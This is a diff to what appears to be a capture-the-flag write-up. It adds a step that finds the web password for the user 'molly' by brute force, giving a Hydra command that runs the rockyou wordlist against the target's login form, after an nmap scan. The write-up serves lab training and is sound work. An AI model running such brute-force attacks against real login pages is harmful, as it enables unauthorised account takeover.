@@ -19,5 +19,17 @@ $ sudo nmap -sV -O <IP>
 ```
 
 The scan results will show that port 80 (HTTP) and the 22 (SSH) port are open.
+When we enter the IP address in our browser, it redirects us to http://<IP>/login
 
-# First Task: Brute Forcing the Web Password
+# First task is to find the web password
+
+For this, we are using brute force.
+
+I preferred to use Hydra, but you can also do it with other brute force tools (Burp Suite, etc.). Here's the Hydra command I used
+```shell
+hydra -l molly -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
+```
+
+
+
+
